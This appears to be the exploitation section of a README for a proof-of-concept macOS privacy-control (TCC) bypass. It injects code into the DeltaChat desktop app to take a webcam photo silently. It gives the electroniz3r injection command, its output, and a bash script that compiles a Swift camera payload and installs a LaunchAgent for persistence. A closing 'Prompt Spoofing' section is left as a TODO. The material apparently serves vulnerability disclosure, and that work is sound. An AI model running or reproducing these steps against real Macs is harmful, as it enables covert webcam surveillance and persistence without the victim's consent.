# Exploitation


### Automated 

>**Note:** When running this proof-of-concept, the Terminal app does not need a prompt for camera access. This is because the camera permission is granted to DeltaChat, and the injected code inherits those permissions, effectively bypassing macOS TCC restrictions.

Run the following from Terminal using [electroniz3r](https://github.com/r3ggi/electroniz3r)

```sh
electroniz3r inject /Applications/DeltaChat.app/ --predefined-script takeSelfie
```

Sample output:
```sh
/Applications/DeltaChat.app/ started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/56264727-4473-4393-b712-7e24c65a1c71
Check /tmp/selfie.jpg
```

Confirm the result by running:
```sh
open /tmp/selfie.jpg
```

<img width="1502" height="470" alt="poc-delta" src="https://github.com/user-attachments/assets/6bcc6604-8707-4924-89c8-2d8985aab39e" />

A picture is taken using the system webcam, without Terminal having any camera access this demonstrates a successful TCC bypass.

### Manual 

Clone the repository and then execute the bash script, the bash script autoexploits the TCC Bypass, creating a selfie without triggering a new TCC prompt.
```sh
bash deltachat_camera_bypass.sh
# or
chmod +x deltachat_camera_bypass.sh && ./deltachat_camera_bypass.sh
```

Example output:
```sh
kunpeeks@MacBook-Pro-van-Kun 1 % ./deltachat_camera_bypass.sh
[*] Step 1: Write Swift camera payload to /tmp/selfie_payload.swift
[*] Step 2: Compile Swift payload to /Users/kunpeeks/Desktop/selfie
[*] Step 3: Create LaunchAgent plist at /Users/kunpeeks/Library/LaunchAgents/com.deltachat.tcc.camera.plist
[*] Step 4: Load LaunchAgent and trigger DeltaChat
[*] Waiting 5 seconds for selfie to complete...
[*] Checking selfie result:
[+] Selfie saved at /tmp/selfie.jpg
```


### Prompt Spoofing

TODO: xxx

